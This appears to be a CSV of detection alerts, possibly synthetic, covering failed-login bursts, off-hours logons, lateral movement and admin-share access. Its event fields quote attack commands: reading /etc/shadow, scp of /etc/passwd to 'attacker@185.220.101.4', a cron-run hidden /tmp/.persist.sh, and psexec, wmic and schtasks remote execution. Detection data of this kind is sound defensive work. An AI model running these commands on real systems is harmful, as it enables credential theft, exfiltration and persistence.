+2025-11-12 02:16:22,ali,dc01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.5] on dc01: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.7
+2025-11-12 02:16:22,ali,dc01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.5] on dc01 cmd: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.85
+2025-11-12 02:16:22,ali,dc01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.5] cmd: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.8
+2025-11-12 03:10:00,nadia,host004,Failed login burst before success,Event 4625 [- | src=185.220.101.4] Failed logon attempt #1/4 on host004,0.85
+2025-11-12 03:10:00,nadia,linux-app03,Failed login burst before success,Event 4625 [sshd | src=185.220.101.4] Failed logon attempt #2/4 on linux-app03,0.85
+2025-11-12 03:10:15,nadia,host004,Failed login burst before success,Event 4625 [- | src=185.220.101.4] Failed logon attempt #3/4 on host004,0.85
+2025-11-12 03:10:15,nadia,linux-app03,Failed login burst before success,Event 4625 [sshd | src=185.220.101.4] Failed logon attempt #4/4 on linux-app03,0.85
+2025-11-12 03:10:30,nadia,linux-app03,Failed login burst before success,Event 4625 [sshd | src=185.220.101.4] Failed logon attempt #2/4 on linux-app03,0.85
+2025-11-12 03:10:30,nadia,host004,Failed login burst before success,Event 4625 [- | src=185.220.101.4] Failed logon attempt #1/4 on host004,0.85
+2025-11-12 03:10:45,nadia,host004,Failed login burst before success,Event 4625 [- | src=185.220.101.4] Failed logon attempt #4/4 on host004,0.85
+2025-11-12 03:10:45,nadia,linux-app03,Failed login burst before success,Event 4625 [sshd | src=185.220.101.4] Failed logon attempt #3/4 on linux-app03,0.85
+2025-11-12 03:11:10,nadia,host004,Login outside working hours,Event 4624 [explorer.exe | src=185.220.101.4] logon on host004 at 03:11:10 (outside 06:00-18:00),0.55
+2025-11-12 03:11:18,nadia,host004,Login outside working hours,Event 4624 [mstsc.exe | src=185.220.101.4] logon on host004 at 03:11:18 (outside 06:00-18:00),0.55
+2025-11-12 03:11:30,nadia,host004,Admin share access,Event 4688 [powershell.exe | src=185.220.101.4] cmd: Invoke-Command -ComputerName linux-prod01 -ScriptBlock {whoami; net user /domain},0.8
+2025-11-12 03:11:30,nadia,host004,Remote process creation,Event 4688 [powershell.exe | src=185.220.101.4] on host004: Invoke-Command -ComputerName linux-prod01 -ScriptBlock {whoami; net user /domain},0.7
+2025-11-12 03:12:00,nadia,linux-prod01,Login outside working hours,Event 4624 [sshd | src=10.0.0.15] logon on linux-prod01 at 03:12:00 (outside 06:00-18:00),0.55
+2025-11-12 03:12:00,nadia,linux-prod01,Sensitive host access,Event 4624 [sshd | src=10.0.0.15] on linux-prod01 (unauthorized host access),0.85
+2025-11-12 03:12:15,nadia,linux-prod01,Sensitive host access,Event 4688 [sudo | src=-] on linux-prod01 cmd: /usr/bin/cat /etc/shadow,0.85
+2025-11-12 03:12:15,nadia,linux-prod01,Remote process creation,Event 4688 [sudo | src=-] on linux-prod01: /usr/bin/cat /etc/shadow,0.7
+2025-11-12 03:12:25,nadia,linux-prod01,Sensitive host access,Event 4688 [scp | src=10.0.0.15] on linux-prod01 cmd: scp /etc/passwd attacker@185.220.101.4:/tmp/,0.85
+2025-11-12 03:12:25,nadia,linux-prod01,Remote process creation,Event 4688 [scp | src=10.0.0.15] on linux-prod01: scp /etc/passwd attacker@185.220.101.4:/tmp/,0.7
+2025-11-12 03:12:35,nadia,linux-prod01,Remote process creation,Event 4688 [cron | src=-] on linux-prod01: /tmp/.persist.sh,0.7
+2025-11-12 03:12:35,nadia,linux-prod01,Sensitive host access,Event 4688 [cron | src=-] on linux-prod01 cmd: /tmp/.persist.sh,0.85
+2025-11-12 03:14:00,nadia,linux-db01,Multiple hosts in short time,Event 4624 [sshd | src=10.0.0.15] hopped to linux-db01 (after ['linux-prod01']),0.75
+2025-11-12 03:14:00,nadia,linux-db01,Sensitive host access,Event 4624 [sshd | src=10.0.0.15] on linux-db01 (unauthorized host access),0.85
+2025-11-12 03:14:00,nadia,linux-db01,Login outside working hours,Event 4624 [sshd | src=10.0.0.15] logon on linux-db01 at 03:14:00 (outside 06:00-18:00),0.55
+2025-11-12 03:14:15,nadia,linux-db01,Sensitive host access,Event 4688 [sudo | src=-] on linux-db01 cmd: /usr/bin/cat /etc/shadow,0.85
+2025-11-12 03:14:15,nadia,linux-db01,Remote process creation,Event 4688 [sudo | src=-] on linux-db01: /usr/bin/cat /etc/shadow,0.7
+2025-11-12 03:14:25,nadia,linux-db01,Remote process creation,Event 4688 [scp | src=10.0.0.15] on linux-db01: scp /etc/passwd attacker@185.220.101.4:/tmp/,0.7
+2025-11-12 03:14:25,nadia,linux-db01,Sensitive host access,Event 4688 [scp | src=10.0.0.15] on linux-db01 cmd: scp /etc/passwd attacker@185.220.101.4:/tmp/,0.85
+2025-11-12 03:14:35,nadia,linux-db01,Remote process creation,Event 4688 [cron | src=-] on linux-db01: /tmp/.persist.sh,0.7
+2025-11-12 03:14:35,nadia,linux-db01,Sensitive host access,Event 4688 [cron | src=-] on linux-db01 cmd: /tmp/.persist.sh,0.85
+2025-11-12 03:16:00,nadia,db01,Login outside working hours,Event 4624 [- | src=10.0.0.15] logon on db01 at 03:16:00 (outside 06:00-18:00),0.55
+2025-11-12 03:16:00,nadia,db01,Sensitive host access,Event 4624 [- | src=10.0.0.15] on db01 (unauthorized host access),0.85
+2025-11-12 03:16:00,nadia,db01,Multiple hosts in short time,"Event 4624 [- | src=10.0.0.15] hopped to db01 (after ['linux-db01', 'linux-prod01'])",0.75
+2025-11-12 03:16:10,nadia,db01,Admin share access,Event 5140 [- | src=10.0.0.15] cmd: \\db01\C$,0.8
+2025-11-12 03:16:10,nadia,db01,Sensitive host access,Event 5140 [- | src=10.0.0.15] on db01 cmd: \\db01\C$,0.85
+2025-11-12 03:16:12,nadia,db01,Login outside working hours,Event 4624 [mstsc.exe | src=10.0.0.15] logon on db01 at 03:16:12 (outside 06:00-18:00),0.55
+2025-11-12 03:16:12,nadia,db01,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.0.15] on db01 cmd: rdp_session_52,0.85
+2025-11-12 03:16:20,nadia,db01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.15] cmd: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.8
+2025-11-12 03:16:20,nadia,db01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.15] on db01 cmd: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.85
+2025-11-12 03:16:20,nadia,db01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.15] on db01: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.7
+2025-11-12 03:16:22,nadia,db01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.15] on db01 cmd: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.85
+2025-11-12 03:16:22,nadia,db01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.15] cmd: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.8
+2025-11-12 03:16:22,nadia,db01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.15] on db01: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.7
+2025-11-12 21:10:00,ali,linux-app03,Failed login burst before success,Event 4625 [sshd | src=192.168.99.15] Failed logon attempt #2/4 on linux-app03,0.85
+2025-11-12 21:10:00,ali,host001,Failed login burst before success,Event 4625 [- | src=192.168.99.15] Failed logon attempt #1/4 on host001,0.85
+2025-11-12 21:10:15,ali,linux-app03,Failed login burst before success,Event 4625 [sshd | src=192.168.99.15] Failed logon attempt #4/4 on linux-app03,0.85
+2025-11-12 21:10:15,ali,host001,Failed login burst before success,Event 4625 [- | src=192.168.99.15] Failed logon attempt #3/4 on host001,0.85
+2025-11-12 21:10:30,ali,host001,Failed login burst before success,Event 4625 [- | src=192.168.99.15] Failed logon attempt #1/4 on host001,0.85
+2025-11-12 21:10:30,ali,linux-app03,Failed login burst before success,Event 4625 [sshd | src=192.168.99.15] Failed logon attempt #2/4 on linux-app03,0.85
+2025-11-12 21:10:45,ali,linux-app03,Failed login burst before success,Event 4625 [sshd | src=192.168.99.15] Failed logon attempt #3/4 on linux-app03,0.85
+2025-11-12 21:10:45,ali,host001,Failed login burst before success,Event 4625 [- | src=192.168.99.15] Failed logon attempt #4/4 on host001,0.85
+2025-11-12 21:11:10,ali,host001,Login outside working hours,Event 4624 [explorer.exe | src=192.168.99.15] logon on host001 at 21:11:10 (outside 06:00-18:00),0.55
+2025-11-12 21:11:18,ali,host001,Login outside working hours,Event 4624 [mstsc.exe | src=192.168.99.15] logon on host001 at 21:11:18 (outside 06:00-18:00),0.55
+2025-11-12 21:11:30,ali,host001,Admin share access,Event 4688 [powershell.exe | src=192.168.99.15] cmd: Invoke-Command -ComputerName hr01 -ScriptBlock {whoami; net user /domain},0.8
+2025-11-12 21:11:30,ali,host001,Remote process creation,Event 4688 [powershell.exe | src=192.168.99.15] on host001: Invoke-Command -ComputerName hr01 -ScriptBlock {whoami; net user /domain},0.7
+2025-11-12 21:12:00,ali,hr01,Sensitive host access,Event 4624 [- | src=10.0.0.5] on hr01 (unauthorized host access),0.85
+2025-11-12 21:12:00,ali,hr01,Login outside working hours,Event 4624 [- | src=10.0.0.5] logon on hr01 at 21:12:00 (outside 06:00-18:00),0.55
+2025-11-12 21:12:10,ali,hr01,Admin share access,Event 5140 [- | src=10.0.0.5] cmd: \\hr01\C$,0.8
+2025-11-12 21:12:10,ali,hr01,Sensitive host access,Event 5140 [- | src=10.0.0.5] on hr01 cmd: \\hr01\C$,0.85
+2025-11-12 21:12:12,ali,hr01,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.0.5] on hr01 cmd: rdp_session_50,0.85
+2025-11-12 21:12:12,ali,hr01,Login outside working hours,Event 4624 [mstsc.exe | src=10.0.0.5] logon on hr01 at 21:12:12 (outside 06:00-18:00),0.55
+2025-11-12 21:12:20,ali,hr01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.5] cmd: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.8
+2025-11-12 21:12:20,ali,hr01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.5] on hr01: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.7
+2025-11-12 21:12:20,ali,hr01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.5] on hr01 cmd: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.85
+2025-11-12 21:12:22,ali,hr01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.5] cmd: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.8
+2025-11-12 21:12:22,ali,hr01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.5] on hr01 cmd: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.85
+2025-11-12 21:12:22,ali,hr01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.5] on hr01: cmd.exe /c net use \\hr01\ADMIN$ && psexec \\hr01 -s cmd.exe,0.7
+2025-11-12 21:12:30,ali,hr01,Sensitive host access,Event 4698 [schtasks.exe | src=10.0.0.5] on hr01 cmd: schtasks /create /s hr01 /tn SysUpdater /tr cmd.exe,0.85
+2025-11-12 21:12:35,ali,hr01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.5] on hr01 cmd: C:\Windows\PSEXESVC.exe,0.85
+2025-11-12 21:12:35,ali,hr01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.5] on hr01: C:\Windows\PSEXESVC.exe,0.7
+2025-11-12 21:14:00,ali,db01,Sensitive host access,Event 4624 [- | src=10.0.0.5] on db01 (unauthorized host access),0.85
+2025-11-12 21:14:00,ali,db01,Multiple hosts in short time,Event 4624 [- | src=10.0.0.5] hopped to db01 (after ['hr01']),0.75
+2025-11-12 21:14:00,ali,db01,Login outside working hours,Event 4624 [- | src=10.0.0.5] logon on db01 at 21:14:00 (outside 06:00-18:00),0.55
+2025-11-12 21:14:10,ali,db01,Sensitive host access,Event 5140 [- | src=10.0.0.5] on db01 cmd: \\db01\C$,0.85
+2025-11-12 21:14:10,ali,db01,Admin share access,Event 5140 [- | src=10.0.0.5] cmd: \\db01\C$,0.8
+2025-11-12 21:14:12,ali,db01,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.0.5] on db01 cmd: rdp_session_51,0.85
+2025-11-12 21:14:12,ali,db01,Login outside working hours,Event 4624 [mstsc.exe | src=10.0.0.5] logon on db01 at 21:14:12 (outside 06:00-18:00),0.55
+2025-11-12 21:14:20,ali,db01,Sensitive host access,Event 4688 [wmic.exe | src=10.0.0.5] on db01 cmd: wmic /node:db01 process call create powershell.exe,0.85
+2025-11-12 21:14:20,ali,db01,Remote process creation,Event 4688 [wmic.exe | src=10.0.0.5] on db01: wmic /node:db01 process call create powershell.exe,0.7
+2025-11-12 21:14:22,ali,db01,Sensitive host access,Event 4688 [wmic.exe | src=10.0.0.5] on db01 cmd: wmic /node:db01 process call create powershell.exe,0.85
+2025-11-12 21:14:22,ali,db01,Remote process creation,Event 4688 [wmic.exe | src=10.0.0.5] on db01: wmic /node:db01 process call create powershell.exe,0.7
+2025-11-12 21:16:00,ali,dc01,Sensitive host access,Event 4624 [- | src=10.0.0.5] on dc01 (unauthorized host access),0.85
+2025-11-12 21:16:00,ali,dc01,Multiple hosts in short time,"Event 4624 [- | src=10.0.0.5] hopped to dc01 (after ['db01', 'hr01'])",0.75
+2025-11-12 21:16:00,ali,dc01,Login outside working hours,Event 4624 [- | src=10.0.0.5] logon on dc01 at 21:16:00 (outside 06:00-18:00),0.55
+2025-11-12 21:16:10,ali,dc01,Admin share access,Event 5140 [- | src=10.0.0.5] cmd: \\dc01\C$,0.8
+2025-11-12 21:16:10,ali,dc01,Sensitive host access,Event 5140 [- | src=10.0.0.5] on dc01 cmd: \\dc01\C$,0.85
+2025-11-12 21:16:12,ali,dc01,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.0.5] on dc01 cmd: rdp_session_52,0.85
+2025-11-12 21:16:12,ali,dc01,Login outside working hours,Event 4624 [mstsc.exe | src=10.0.0.5] logon on dc01 at 21:16:12 (outside 06:00-18:00),0.55
+2025-11-12 21:16:20,ali,dc01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.5] cmd: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.8
+2025-11-12 21:16:20,ali,dc01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.5] on dc01: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.7
+2025-11-12 21:16:20,ali,dc01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.5] on dc01 cmd: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.85
+2025-11-12 21:16:22,ali,dc01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.5] on dc01 cmd: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.85
+2025-11-12 21:16:22,ali,dc01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.5] on dc01: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.7
+2025-11-12 21:16:22,ali,dc01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.5] cmd: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.8
+2025-11-13 14:10:00,sara,host002,Failed login burst before success,Event 4625 [- | src=10.0.0.8] Failed logon attempt #1/4 on host002,0.85
+2025-11-13 14:10:15,sara,host002,Failed login burst before success,Event 4625 [- | src=10.0.0.8] Failed logon attempt #2/4 on host002,0.85
+2025-11-13 14:10:30,sara,host002,Failed login burst before success,Event 4625 [- | src=10.0.0.8] Failed logon attempt #3/4 on host002,0.85
+2025-11-13 14:10:45,sara,host002,Failed login burst before success,Event 4625 [- | src=10.0.0.8] Failed logon attempt #4/4 on host002,0.85
+2025-11-13 14:11:30,sara,host002,Admin share access,Event 4688 [powershell.exe | src=10.0.0.8] cmd: Invoke-Command -ComputerName finance01 -ScriptBlock {whoami; net user /domain},0.8
+2025-11-13 14:11:30,sara,host002,Remote process creation,Event 4688 [powershell.exe | src=10.0.0.8] on host002: Invoke-Command -ComputerName finance01 -ScriptBlock {whoami; net user /domain},0.7
+2025-11-13 14:12:00,sara,finance01,Sensitive host access,Event 4624 [- | src=10.0.0.8] on finance01 (unauthorized host access),0.85
+2025-11-13 14:12:00,sara,finance01,Multiple hosts in short time,Event 4624 [- | src=10.0.0.8] hopped to finance01 (after ['host002']),0.75
+2025-11-13 14:12:10,sara,finance01,Sensitive host access,Event 5140 [- | src=10.0.0.8] on finance01 cmd: \\finance01\C$,0.85
+2025-11-13 14:12:10,sara,finance01,Admin share access,Event 5140 [- | src=10.0.0.8] cmd: \\finance01\C$,0.8
+2025-11-13 14:12:12,sara,finance01,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.0.8] on finance01 cmd: rdp_session_50,0.85
+2025-11-13 14:12:20,sara,finance01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.8] on finance01: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.7
+2025-11-13 14:12:20,sara,finance01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.8] cmd: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.8
+2025-11-13 14:12:20,sara,finance01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.8] on finance01 cmd: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.85
+2025-11-13 14:12:22,sara,finance01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.8] on finance01 cmd: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.85
+2025-11-13 14:12:22,sara,finance01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.8] cmd: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.8
+2025-11-13 14:12:22,sara,finance01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.8] on finance01: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.7
+2025-11-13 14:12:30,sara,finance01,Sensitive host access,Event 4698 [schtasks.exe | src=10.0.0.8] on finance01 cmd: schtasks /create /s finance01 /tn SysUpdater /tr cmd.exe,0.85
+2025-11-13 14:12:35,sara,finance01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.8] on finance01: C:\Windows\PSEXESVC.exe,0.7
+2025-11-13 14:12:35,sara,finance01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.8] on finance01 cmd: C:\Windows\PSEXESVC.exe,0.85
+2025-11-13 14:14:00,sara,finance02,Sensitive host access,Event 4624 [- | src=10.0.0.8] on finance02 (unauthorized host access),0.85
+2025-11-13 14:14:00,sara,finance02,Multiple hosts in short time,"Event 4624 [- | src=10.0.0.8] hopped to finance02 (after ['finance01', 'host002'])",0.75
+2025-11-13 14:14:10,sara,finance02,Admin share access,Event 5140 [- | src=10.0.0.8] cmd: \\finance02\C$,0.8
+2025-11-13 14:14:10,sara,finance02,Sensitive host access,Event 5140 [- | src=10.0.0.8] on finance02 cmd: \\finance02\C$,0.85
+2025-11-13 14:14:12,sara,finance02,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.0.8] on finance02 cmd: rdp_session_51,0.85
+2025-11-13 14:14:20,sara,finance02,Sensitive host access,Event 4688 [wmic.exe | src=10.0.0.8] on finance02 cmd: wmic /node:finance02 process call create powershell.exe,0.85
+2025-11-13 14:14:20,sara,finance02,Remote process creation,Event 4688 [wmic.exe | src=10.0.0.8] on finance02: wmic /node:finance02 process call create powershell.exe,0.7
+2025-11-13 14:14:22,sara,finance02,Sensitive host access,Event 4688 [wmic.exe | src=10.0.0.8] on finance02 cmd: wmic /node:finance02 process call create powershell.exe,0.85
+2025-11-13 14:14:22,sara,finance02,Remote process creation,Event 4688 [wmic.exe | src=10.0.0.8] on finance02: wmic /node:finance02 process call create powershell.exe,0.7
+2025-11-13 14:16:00,sara,db01,Multiple hosts in short time,"Event 4624 [- | src=10.0.0.8] hopped to db01 (after ['finance01', 'finance02', 'host002'])",0.75
+2025-11-13 14:16:00,sara,db01,Sensitive host access,Event 4624 [- | src=10.0.0.8] on db01 (unauthorized host access),0.85
+2025-11-13 14:16:10,sara,db01,Admin share access,Event 5140 [- | src=10.0.0.8] cmd: \\db01\C$,0.8
+2025-11-13 14:16:10,sara,db01,Sensitive host access,Event 5140 [- | src=10.0.0.8] on db01 cmd: \\db01\C$,0.85
+2025-11-13 14:16:12,sara,db01,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.0.8] on db01 cmd: rdp_session_52,0.85
+2025-11-13 14:16:20,sara,db01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.8] cmd: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.8
+2025-11-13 14:16:20,sara,db01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.8] on db01 cmd: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.85
+2025-11-13 14:16:20,sara,db01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.8] on db01: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.7
+2025-11-13 14:16:22,sara,db01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.8] on db01: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.7
+2025-11-13 14:16:22,sara,db01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.8] on db01 cmd: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.85
+2025-11-13 14:16:22,sara,db01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.8] cmd: cmd.exe /c net use \\db01\ADMIN$ && psexec \\db01 -s cmd.exe,0.8
+2025-11-13 19:10:00,zoya,host006,Failed login burst before success,Event 4625 [- | src=10.0.0.23] Failed logon attempt #1/4 on host006,0.85
+2025-11-13 19:10:15,zoya,host006,Failed login burst before success,Event 4625 [- | src=10.0.0.23] Failed logon attempt #2/4 on host006,0.85
+2025-11-13 19:10:30,zoya,host006,Failed login burst before success,Event 4625 [- | src=10.0.0.23] Failed logon attempt #3/4 on host006,0.85
+2025-11-13 19:10:45,zoya,host006,Failed login burst before success,Event 4625 [- | src=10.0.0.23] Failed logon attempt #4/4 on host006,0.85
+2025-11-13 19:11:10,zoya,host006,Login outside working hours,Event 4624 [explorer.exe | src=10.0.0.23] logon on host006 at 19:11:10 (outside 06:00-18:00),0.55
+2025-11-13 19:11:18,zoya,host006,Login outside working hours,Event 4624 [mstsc.exe | src=10.0.0.23] logon on host006 at 19:11:18 (outside 06:00-18:00),0.55
+2025-11-13 19:11:30,zoya,host006,Remote process creation,Event 4688 [powershell.exe | src=10.0.0.23] on host006: Invoke-Command -ComputerName finance01 -ScriptBlock {whoami; net user /domain},0.7
+2025-11-13 19:11:30,zoya,host006,Admin share access,Event 4688 [powershell.exe | src=10.0.0.23] cmd: Invoke-Command -ComputerName finance01 -ScriptBlock {whoami; net user /domain},0.8
+2025-11-13 19:12:00,zoya,finance01,Login outside working hours,Event 4624 [- | src=10.0.0.23] logon on finance01 at 19:12:00 (outside 06:00-18:00),0.55
+2025-11-13 19:12:00,zoya,finance01,Sensitive host access,Event 4624 [- | src=10.0.0.23] on finance01 (unauthorized host access),0.85
+2025-11-13 19:12:10,zoya,finance01,Admin share access,Event 5140 [- | src=10.0.0.23] cmd: \\finance01\C$,0.8
+2025-11-13 19:12:10,zoya,finance01,Sensitive host access,Event 5140 [- | src=10.0.0.23] on finance01 cmd: \\finance01\C$,0.85
+2025-11-13 19:12:12,zoya,finance01,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.0.23] on finance01 cmd: rdp_session_50,0.85
+2025-11-13 19:12:12,zoya,finance01,Login outside working hours,Event 4624 [mstsc.exe | src=10.0.0.23] logon on finance01 at 19:12:12 (outside 06:00-18:00),0.55
+2025-11-13 19:12:20,zoya,finance01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.23] on finance01 cmd: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.85
+2025-11-13 19:12:20,zoya,finance01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.23] on finance01: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.7
+2025-11-13 19:12:20,zoya,finance01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.23] cmd: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.8
+2025-11-13 19:12:22,zoya,finance01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.23] on finance01 cmd: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.85
+2025-11-13 19:12:22,zoya,finance01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.23] cmd: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.8
+2025-11-13 19:12:22,zoya,finance01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.23] on finance01: cmd.exe /c net use \\finance01\ADMIN$ && psexec \\finance01 -s cmd.exe,0.7
+2025-11-13 19:12:30,zoya,finance01,Sensitive host access,Event 4698 [schtasks.exe | src=10.0.0.23] on finance01 cmd: schtasks /create /s finance01 /tn SysUpdater /tr cmd.exe,0.85
+2025-11-13 19:12:35,zoya,finance01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.23] on finance01: C:\Windows\PSEXESVC.exe,0.7
+2025-11-13 19:12:35,zoya,finance01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.23] on finance01 cmd: C:\Windows\PSEXESVC.exe,0.85
+2025-11-13 19:14:00,zoya,hr02,Sensitive host access,Event 4624 [- | src=10.0.0.23] on hr02 (unauthorized host access),0.85
+2025-11-13 19:14:00,zoya,hr02,Multiple hosts in short time,Event 4624 [- | src=10.0.0.23] hopped to hr02 (after ['finance01']),0.75
+2025-11-13 19:14:00,zoya,hr02,Login outside working hours,Event 4624 [- | src=10.0.0.23] logon on hr02 at 19:14:00 (outside 06:00-18:00),0.55
+2025-11-13 19:14:10,zoya,hr02,Sensitive host access,Event 5140 [- | src=10.0.0.23] on hr02 cmd: \\hr02\C$,0.85
+2025-11-13 19:14:10,zoya,hr02,Admin share access,Event 5140 [- | src=10.0.0.23] cmd: \\hr02\C$,0.8
+2025-11-13 19:14:12,zoya,hr02,Login outside working hours,Event 4624 [mstsc.exe | src=10.0.0.23] logon on hr02 at 19:14:12 (outside 06:00-18:00),0.55
+2025-11-13 19:14:12,zoya,hr02,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.0.23] on hr02 cmd: rdp_session_51,0.85
+2025-11-13 19:14:20,zoya,hr02,Remote process creation,Event 4688 [wmic.exe | src=10.0.0.23] on hr02: wmic /node:hr02 process call create powershell.exe,0.7
+2025-11-13 19:14:20,zoya,hr02,Sensitive host access,Event 4688 [wmic.exe | src=10.0.0.23] on hr02 cmd: wmic /node:hr02 process call create powershell.exe,0.85
+2025-11-13 19:14:22,zoya,hr02,Remote process creation,Event 4688 [wmic.exe | src=10.0.0.23] on hr02: wmic /node:hr02 process call create powershell.exe,0.7
+2025-11-13 19:14:22,zoya,hr02,Sensitive host access,Event 4688 [wmic.exe | src=10.0.0.23] on hr02 cmd: wmic /node:hr02 process call create powershell.exe,0.85
+2025-11-13 19:16:00,zoya,dc01,Login outside working hours,Event 4624 [- | src=10.0.0.23] logon on dc01 at 19:16:00 (outside 06:00-18:00),0.55
+2025-11-13 19:16:00,zoya,dc01,Sensitive host access,Event 4624 [- | src=10.0.0.23] on dc01 (unauthorized host access),0.85
+2025-11-13 19:16:00,zoya,dc01,Multiple hosts in short time,"Event 4624 [- | src=10.0.0.23] hopped to dc01 (after ['finance01', 'hr02'])",0.75
+2025-11-13 19:16:10,zoya,dc01,Sensitive host access,Event 5140 [- | src=10.0.0.23] on dc01 cmd: \\dc01\C$,0.85
+2025-11-13 19:16:10,zoya,dc01,Admin share access,Event 5140 [- | src=10.0.0.23] cmd: \\dc01\C$,0.8
+2025-11-13 19:16:12,zoya,dc01,Sensitive host access,Event 4624 [mstsc.exe | src=10.0.0.23] on dc01 cmd: rdp_session_52,0.85
+2025-11-13 19:16:12,zoya,dc01,Login outside working hours,Event 4624 [mstsc.exe | src=10.0.0.23] logon on dc01 at 19:16:12 (outside 06:00-18:00),0.55
+2025-11-13 19:16:20,zoya,dc01,Sensitive host access,Event 4688 [psexec.exe | src=10.0.0.23] on dc01 cmd: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.85
+2025-11-13 19:16:20,zoya,dc01,Admin share access,Event 4688 [psexec.exe | src=10.0.0.23] cmd: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.8
+2025-11-13 19:16:20,zoya,dc01,Remote process creation,Event 4688 [psexec.exe | src=10.0.0.23] on dc01: cmd.exe /c net use \\dc01\ADMIN$ && psexec \\dc01 -s cmd.exe,0.7
